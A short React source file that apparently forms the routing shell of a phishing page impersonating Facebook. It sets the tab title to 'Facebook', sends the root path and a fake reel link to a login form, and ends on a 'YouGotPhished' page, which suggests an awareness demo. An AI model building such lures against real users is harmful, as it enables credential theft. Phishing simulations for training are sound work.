import {useEffect} from 'react'
import './App.css';
import {
  Routes,
  Route,
} from "react-router-dom";
import Login from './Login'
import YouGotPhished from './YouGotPhished';

function App() {

  
    // This effect runs once, after the first render.
    useEffect(() => {
    document.title = "Facebook"
    }, [])

  return (
    <div>
      <Routes>
      <Route  path="/" element={<Login />} />
      <Route path="/reel/3971921196367067" element={<Login />} />
      <Route path="/profile" element={<YouGotPhished />} />

    </Routes>
   
    </div>
  );
}

export default App;
